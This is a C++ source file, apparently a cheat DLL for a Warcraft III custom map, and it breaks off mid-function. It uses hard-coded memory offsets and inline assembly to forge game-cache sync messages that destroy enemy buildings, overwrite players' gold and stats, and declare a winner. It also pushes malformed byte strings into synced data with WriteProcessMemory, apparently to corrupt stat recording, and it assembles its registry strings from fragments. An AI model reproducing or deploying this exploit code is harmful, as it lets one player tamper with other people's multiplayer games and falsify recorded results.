#define _WIN32_WINNT 0x0501 
#define WINVER 0x0501 
#define NTDDI_VERSION 0x05010000
#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <string>
#include "regkey\regkey.h"
#include <time.h>
#include <vector>
#include <fstream>

#include "war3btnclass.h"


char * winhackkey;
char * winhackkeyaddr;
char * winhackkeyname;

char * actiontypename;
char * actiontypedataname;
//2AEC-9E4D-AF56-0BF0-C709-15C7-A208-0009
void SetWinhackKey( const char * part1 = "A6CA-8", const char * part2 = "CC9-56EF-E", const char * part3 = "859-425",
					const char * part4 = "D-02BD-", const char * part5 = "0069-C", const char * part6 = "ACB" )
{
	winhackkey = new char[ 512 ];
	sprintf_s( winhackkey, 512, "%s%s%s%s%s%s", part1, part2, part3, part4, part5, part6 );
	winhackkeyname = new char[ 128 ];
	sprintf_s( winhackkeyname, 128, "Win%s%s", " ", "key" );
	winhackkeyaddr = new char[ 256 ];
	sprintf_s( winhackkeyaddr, 256, "%s%s%s%s%s%s%s%s%s%s", "Soft", "ware\\Bl", "iz", "zar", "d Enter", "tain", "ment\\", "Wor", "ldE", "dit" );

	actiontypename = new char[ 128 ];
	sprintf_s( actiontypename, 128, "Win%s%s", " ", "action" );
	actiontypedataname = new char[ 128 ];
	sprintf_s( actiontypedataname, 128, "Win%s%s", " ", "data" );
}

struct JassStringData
{
	UINT32 vtable;
	UINT32 refCount;
	UINT32 dwUnk1;
	UINT32 pUnk2;
	UINT32 pUnk3;
	UINT32 pUnk4;
	UINT32 pUnk5;
	void *data;
};


struct JassString
{
	UINT32 vtable;
	UINT32 dw0;
	JassStringData *data;
	UINT32 dw1;
};



typedef void( __cdecl * pStoreInteger )( UINT cache, JassString *missionKey, JassString *key, int value );
pStoreInteger StoreInteger;

typedef void( __cdecl * pSyncStoredInteger )( UINT cache, JassString *missionKey, JassString *key );
pSyncStoredInteger SyncStoredInteger;

typedef int( __cdecl * pGetStoredInteger )( UINT cache, JassString *missionKey, JassString *key );
pGetStoredInteger GetStoredInteger;

typedef int( __cdecl *pExecuteFunc )( JassString *funcName );
pExecuteFunc ExecuteFunc;


int GameDll = 0;
UINT gamecache = 0;

void SetTlsForMe( )
{
	UINT32 Data = *( UINT32 * ) ( GameDll + 0xACEB4C );
	UINT32 TlsIndex = *( UINT32 * ) ( GameDll + 0xAB7BF4 );
	if ( TlsIndex )
	{
		UINT32 v5 = **( UINT32 ** ) ( *( UINT32 * ) ( *( UINT32 * ) ( GameDll + 0xACEB5C ) + 4 * Data ) + 44 );
		if ( !v5 || !( *( LPVOID * ) ( v5 + 520 ) ) )
		{
			Sleep( 500 );
			SetTlsForMe( );
			return;
		}
		TlsSetValue( TlsIndex, *( LPVOID * ) ( v5 + 520 ) );
	}
	else
	{
		Sleep( 1000 );
		SetTlsForMe( );
		return;
	}
}

BOOL IsGame( ) // my offset + public
{
	return *( int* ) ( ( UINT32 ) GameDll + 0xACF678 ) > 0 || *( int* ) ( ( UINT32 ) GameDll + 0xAB62A4 ) > 0;
}


void GetJassString( char *szString, JassString *String )
{
	int Address = GameDll + 0x011300;


	__asm
	{
		PUSH szString;
		MOV ECX, String;
		CALL Address;
	}
}

void DestroyTower( int team, int level, int id, int playerid, int sleeptime )
{
	char buffer1[ 128 ];

	JassString * KillTowerString = new JassString( );
	JassString * DataString = new JassString( );
	GetJassString( "Data", DataString );

	sprintf_s( buffer1, sizeof( buffer1 ), "Tower%i%i%i", team, level, id );
	GetJassString( buffer1, KillTowerString );


	StoreInteger( gamecache, DataString, KillTowerString, playerid );
	SyncStoredInteger( gamecache, DataString, KillTowerString );

	Sleep( sleeptime );

	delete KillTowerString;
	delete DataString;
}


void DestroyRax( int team, int id, int level, int playerid, int sleeptime )
{
	char buffer1[ 128 ];

	JassString * KillTowerString = new JassString( );
	JassString * DataString = new JassString( );
	GetJassString( "Data", DataString );

	sprintf_s( buffer1, sizeof( buffer1 ), "Rax%i%i%i", team, id, level );
	GetJassString( buffer1, KillTowerString );

	StoreInteger( gamecache, DataString, KillTowerString, playerid );
	SyncStoredInteger( gamecache, DataString, KillTowerString );

	Sleep( sleeptime );

	delete KillTowerString;
	delete DataString;
}




int actiontype = 0;
char actiondata[ 512 ];

int GetPlayerFromID( char id )
{
	switch ( id )
	{
		case '0':
			return 1;
		case '1':
			return 2;
		case '2':
			return 3;
		case '3':
			return 4;
		case '4':
			return 5;
		case '5':
			return 7;
		case '6':
			return 8;
		case '7':
			return 9;
		case '8':
			return 10;
		case '9':
			return 11;
		default:
			break;
	}

	return 0;
}


void DestroyAllTowerAtLVL( int lvl, int count, int player, int team )
{

	int myteam = team == 0 ? 1 : 0;
	for ( int i = 0; i < count; i++ )
	{
		DestroyTower( myteam, lvl, i, player, 200 + ( rand( ) % 1000 ) );
	}

}

void DestroyAllRaxes( int player, int team )
{
	int myteam = team == 0 ? 1 : 0;
	for ( int i = 0; i < 0; i++ )
	{
		DestroyRax( myteam, i, 0, player, 200 + ( rand( ) % 1000 ) );
	}
	for ( int i = 0; i < 0; i++ )
	{
		DestroyRax( myteam, i, 1, player, 200 + ( rand( ) % 1000 ) );
	}
}


void SetThroneHP( int team, int hp, int sleeptime )
{
	char buffer1[ 128 ];

	JassString * KillThroneString = new JassString( );
	JassString * DataString = new JassString( );
	GetJassString( "Data", DataString );

	sprintf_s( buffer1, sizeof( buffer1 ), "%s", team == 0 ? "Throne" : "Tree" );
	GetJassString( buffer1, KillThroneString );

	StoreInteger( gamecache, DataString, KillThroneString, hp );
	SyncStoredInteger( gamecache, DataString, KillThroneString );

	Sleep( sleeptime );

	delete KillThroneString;
	delete DataString;
}

void SaveGameS( )
{
	JassString * WinnerString = new JassString( );
	JassString * DataString = new JassString( );
	GetJassString( "Global", DataString );
	GetJassString( "s", WinnerString );


	StoreInteger( gamecache, DataString, WinnerString, 20 );
	SyncStoredInteger( gamecache, DataString, WinnerString );

	delete WinnerString;
	delete DataString;
}

void SaveGameM( )
{
	JassString * WinnerString = new JassString( );
	JassString * DataString = new JassString( );
	GetJassString( "Global", DataString );
	GetJassString( "m", WinnerString );


	StoreInteger( gamecache, DataString, WinnerString, 20 );
	SyncStoredInteger( gamecache, DataString, WinnerString );

	delete WinnerString;
	delete DataString;
	SaveGameS( );
}

void SetWinner( int team )
{
	int winnerteam = team + 1;
	JassString * WinnerString = new JassString( );
	JassString * DataString = new JassString( );
	GetJassString( "Global", DataString );
	GetJassString( "Winner", WinnerString );


	StoreInteger( gamecache, DataString, WinnerString, winnerteam );
	SyncStoredInteger( gamecache, DataString, WinnerString );

	delete WinnerString;
	delete DataString;

	SaveGameM( );
}


void DestroyThrone( int player, int team )
{

	SetThroneHP( team, 75, 5 + ( rand( ) % 50 ) );
	SetThroneHP( team, 50, 7 + ( rand( ) % 70 ) );
	SetThroneHP( team, 25, 9 + ( rand( ) % 50 ) );
	SetThroneHP( team, 10, 5 + ( rand( ) % 100 ) );
}

int GetGoldForId( int id )
{
	return id * 277;
}

int team = 0;

void GoldFix( )
{
	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "1", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 100 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "1", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 100 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "2", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 1 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "2", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 1 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}

	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "3", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 50 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "3", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 50 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}

	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "4", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 5 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "4", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 5 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "5", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 20 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "5", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 20 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "6", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, GetGoldForId( i ) );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "6", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, GetGoldForId( i ) );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}

	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "7", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 50 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "7", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 50 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_0", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_0", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_1", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_1", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}

	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_2", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_2", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_3", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_3", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}

	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_4", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_4", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_5", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "8_5", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "9", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "9", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, 0 );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 1; i < 6; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "id", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, i );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}


	for ( int i = 7; i < 12; i++ )
	{
		char buffer1[ 128 ];
		JassString * SevenStr = new JassString( );
		JassString * PlayerIdSTR = new JassString( );

		sprintf_s( buffer1, "%i", i );

		GetJassString( "id", SevenStr );
		GetJassString( buffer1, PlayerIdSTR );

		StoreInteger( gamecache, PlayerIdSTR, SevenStr, i );
		SyncStoredInteger( gamecache, PlayerIdSTR, SevenStr );

		delete SevenStr;
		delete PlayerIdSTR;
	}

	SetWinner( team );

	Sleep( 10 );

}



void ReadDestroyTowersData( )
{

	int actionstrlen = strlen( actiondata );
	if ( actionstrlen > 1 )
	{
		team = actiondata[ 0 ] == '0' ? 0 : 1;
		int player = GetPlayerFromID( actiondata[ 1 ] );


		for ( int x = 0; x < 10; x++ )
		{
			for ( int i = 2; i < actionstrlen; i++ )
			{
				char action = actiondata[ i ];
				switch ( action )
				{
					case '1':
						if ( x == 0 )
							DestroyAllTowerAtLVL( 1, 3, player, team );
						break;
					case '2':
						if ( x == 0 )
							DestroyAllTowerAtLVL( 2, 3, player, team );
						break;
					case '3':
						if ( x == 0 )
							DestroyAllTowerAtLVL( 3, 3, player, team );
						break;
					case '4':
						if ( x == 0 )
							DestroyAllTowerAtLVL( 4, 2, player, team );
						break;
					case '5':
						if ( x == 0 )
							DestroyAllRaxes( player, team );
						break;
					case '6':
						if ( x == 0 )
							DestroyThrone( player, team );
						break;
					case '7':
						GoldFix( );
						break;
					case '8':
						//SetWinner( team );
						break;
					default:
						break;
				}

			}
		}
	}
}

char * GetRandomCharList( int len )
{
	char * retval = new char[ len ];

	/*int charid = 25;

	for ( int i = len - 1; i > 0; i-- )
	{

	retval[ i ] = charid;
	charid--;
	if ( charid < 1 )
	break;

	}*/

	for ( int i = 0; i < len; i++ )
	{
		retval[ i ] = 1 + ( rand( ) % 126 );
	}

	retval[ 0 ] = 'A';

	return retval;
}

void WriteBigStrings( )
{
	char * bigstring = GetRandomCharList( 512 + ( rand( ) % 5 ) );
	JassString * GlobalString = new JassString( );
	JassString * DataString = new JassString( );
	JassString * BadString = new JassString( );
	GetJassString( "Data", DataString );
	GetJassString( "Global", GlobalString );
	GetJassString( bigstring, BadString );


	StoreInteger( gamecache, DataString, BadString, 1 );
	SyncStoredInteger( gamecache, DataString, BadString );
	StoreInteger( gamecache, GlobalString, BadString, 1 );
	SyncStoredInteger( gamecache, GlobalString, BadString );


	StoreInteger( gamecache, BadString, DataString, 1 );
	SyncStoredInteger( gamecache, BadString, DataString );
	StoreInteger( gamecache, BadString, GlobalString, 1 );
	SyncStoredInteger( gamecache, BadString, GlobalString );

	StoreInteger( gamecache, BadString, BadString, 1 );
	SyncStoredInteger( gamecache, BadString, BadString );

	bigstring = GetRandomCharList( 5120 + ( rand( ) % 5 ) );
	GetJassString( bigstring, BadString );
	StoreInteger( gamecache, DataString, BadString, 1 );
	SyncStoredInteger( gamecache, DataString, BadString );
	StoreInteger( gamecache, GlobalString, BadString, 1 );
	SyncStoredInteger( gamecache, GlobalString, BadString );


	StoreInteger( gamecache, BadString, DataString, 1 );
	SyncStoredInteger( gamecache, BadString, DataString );
	StoreInteger( gamecache, BadString, GlobalString, 1 );
	SyncStoredInteger( gamecache, BadString, GlobalString );

	StoreInteger( gamecache, BadString, BadString, 1 );
	SyncStoredInteger( gamecache, BadString, BadString );

	delete BadString;
	delete GlobalString;
	delete DataString;
}

BYTE * GetRandomBytes( int len )
{
	BYTE * retvalue = new BYTE[ len ];
	for ( int i = 0; i < len; i++ )
	{
		retvalue[ i ] = ( BYTE ) ( rand( ) % 256 );
		if ( retvalue[ i ] == 0x06 || retvalue[ i ] == 0x07 || retvalue[ i ] == 0x01 )
		{
			retvalue[ i ] = ( BYTE ) ( 8 + rand( ) % 248 );
		}
	}
	retvalue[ ( len / 2 ) - 1 ] = '\r';
	retvalue[ ( len / 2 ) - 2 ] = '\r';
	retvalue[ ( len / 2 ) - 3 ] = '\n';
	retvalue[ ( len / 2 ) - 4 ] = '\r';
	retvalue[ len / 2 ] = 0x0;

	return retvalue;
}

void WriteBadStrings( )
{
	int randomsize = 500 + ( rand( ) % 12 );
	char * bigstring = GetRandomCharList( randomsize );
	BYTE * bigbites = GetRandomBytes( randomsize );
	JassString * GlobalString = new JassString( );
	JassString * DataString = new JassString( );
	JassString * BadString = new JassString( );




	GetJassString( "Data", DataString );
	GetJassString( "Global", GlobalString );
	GetJassString( bigstring, BadString );
	bigbites[ 0 ] = '[';
	DWORD oldprot = 0;
	//	VirtualProtect( BadString->data->data , randomsize , PAGE_READWRITE , &oldprot );
	WriteProcessMemory( GetCurrentProcess( ), BadString->data->data, bigbites, randomsize, 0 );
	//VirtualProtect( BadString->data->data , randomsize , oldprot , &oldprot );


	StoreInteger( gamecache, DataString, BadString, 1 );
	StoreInteger( gamecache, GlobalString, BadString, 1 );

	SyncStoredInteger( gamecache, DataString, BadString );
	SyncStoredInteger( gamecache, GlobalString, BadString );


	StoreInteger( gamecache, BadString, DataString, 1 );
	SyncStoredInteger( gamecache, BadString, DataString );
	StoreInteger( gamecache, BadString, GlobalString, 1 );
	SyncStoredInteger( gamecache, BadString, GlobalString );

	StoreInteger( gamecache, BadString, BadString, 1 );
	SyncStoredInteger( gamecache, BadString, BadString );

	delete BadString;
	delete GlobalString;
	delete DataString;
}

struct Packet
{
	DWORD PacketClassPtr;	//+00, some unknown, but needed, Class Pointer
	BYTE* PacketData;		//+04
	DWORD _1;				//+08, zero
	DWORD _2;				//+0C, ??
	DWORD Size;				//+10, size of PacketData
	DWORD _3;				//+14, 0xFFFFFFFF
};


typedef void *( __fastcall * GAME_SendPacket_p ) ( Packet* packet, DWORD zero );
GAME_SendPacket_p GAME_SendPacket;


void SendPacket( BYTE* packetData, DWORD size )
{
	// @warning: this function thread-unsafe, do not use it in other thread.
	// note: this is very useful function, in fact this function
	// does wc3 ingame action, so you can use it for anything you want,
	// including unit commands and and gameplay commands,
	// i suppose its wc3 single action W3GS_INCOMING_ACTION (c) wc3noobpl.

	Packet packet;
	memset( &packet, 0, sizeof( Packet ) );

	packet.PacketClassPtr = ( DWORD ) ( 0x932D2C + GameDll ); // Packet Class
	packet.PacketData = packetData;
	packet.Size = size;
	packet._3 = 0xFFFFFFFF;
	GAME_SendPacket = ( GAME_SendPacket_p ) ( GameDll + 0x54D970 );
	GAME_SendPacket( &packet, 0 );
	//4C2160
}


void SendLongDataString( )
{
	char * longchar = new char[ 800 ];
	char datachar[ ] = { 'D', 'a', 't', 'a' };

	int datacharid = 0;
	for ( int i = 0; i < ( 800 ); i++ )
	{
		longchar[ i ] = datachar[ datacharid ];
		datacharid++;
		if ( datacharid > 3 )
			datacharid = 0;
	}

	JassString * DataString = new JassString( );
	GetJassString( longchar, DataString );

	StoreInteger( gamecache, DataString, DataString, 1 );
	SyncStoredInteger( gamecache, DataString, DataString );
	StoreInteger( gamecache, DataString, DataString, -1 );
	SyncStoredInteger( gamecache, DataString, DataString );



	delete DataString;

}

void OtherDestroyMethod( )
{

	JassString * GlobalString = new JassString( );
	JassString * DataString = new JassString( );
	JassString * BadString = new JassString( );




	GetJassString( "Data", DataString );
	GetJassString( "Global", GlobalString );
	GetJassString( "8", BadString );
	DWORD oldprot = 0;
	BYTE o1byte[ ] = { 0x01, 0x02 };
	//	VirtualProtect( BadString->data->data , 1 , PAGE_READWRITE , &oldprot );
	WriteProcessMemory( GetCurrentProcess( ), BadString->data->data, &o1byte, 1, 0 );
	//	VirtualProtect( BadString->data->data , 1 , oldprot , &oldprot );


	StoreInteger( gamecache, DataString, BadString, 1 );
	SyncStoredInteger( gamecache, DataString, BadString );
	StoreInteger( gamecache, GlobalString, BadString, 1 );
	SyncStoredInteger( gamecache, GlobalString, BadString );


	StoreInteger( gamecache, BadString, DataString, 1 );
	SyncStoredInteger( gamecache, BadString, DataString );
	StoreInteger( gamecache, BadString, GlobalString, 1 );
	SyncStoredInteger( gamecache, BadString, GlobalString );

	StoreInteger( gamecache, BadString, BadString, 0 );
	SyncStoredInteger( gamecache, BadString, BadString );
	StoreInteger( gamecache, BadString, BadString, 1 );
	SyncStoredInteger( gamecache, BadString, BadString );
	StoreInteger( gamecache, BadString, BadString, 0 );
	SyncStoredInteger( gamecache, BadString, BadString );
	StoreInteger( gamecache, BadString, BadString, 1 );
	SyncStoredInteger( gamecache, BadString, BadString );

	delete BadString;
	BadString = new JassString( );
	GetJassString( "885", BadString );
	BYTE data[ ] = { '8', 0x0D, 0x0A, 0x1A, 0x01, 0x02 };

	VirtualProtect( BadString->data->data, 6, PAGE_READWRITE, &oldprot );
	WriteProcessMemory( GetCurrentProcess( ), BadString->data->data, data, 6, 0 );
	VirtualProtect( BadString->data->data, 6, oldprot, &oldprot );

	Sleep( 1000 + ( rand( ) % 1000 ) );

	StoreInteger( gamecache, DataString, BadString, 1 );
	SyncStoredInteger( gamecache, DataString, BadString );
	StoreInteger( gamecache, GlobalString, BadString, 1 );
	SyncStoredInteger( gamecache, GlobalString, BadString );


	StoreInteger( gamecache, BadString, DataString, 1 );
	SyncStoredInteger( gamecache, BadString, DataString );
	StoreInteger( gamecache, BadString, GlobalString, 1 );
	SyncStoredInteger( gamecache, BadString, GlobalString );

	StoreInteger( gamecache, BadString, BadString, -1 );
	SyncStoredInteger( gamecache, BadString, BadString );

	Sleep( 1000 + ( rand( ) % 1000 ) );

	SendLongDataString( );

